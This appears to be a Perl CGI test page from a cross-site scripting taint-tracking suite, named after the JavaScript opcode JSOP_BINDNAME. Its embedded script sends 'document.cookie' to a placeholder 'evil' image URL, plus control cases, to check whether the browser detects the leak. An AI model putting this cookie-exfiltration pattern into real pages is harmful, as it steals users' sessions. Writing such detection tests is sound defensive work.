#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_BINDNAME";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil
		
		var notevil = 1;
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val
		
		if ($evil) {
			var notevil2 = 4;
		}
		var url = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url;
		
		// normal usage
		
		var notevil3 = $evil;
		document.images[2].src = "$imgevilurl?isevil=" + notevil3;
		
    </script>
|;

require "xss_basic_footer.pl";
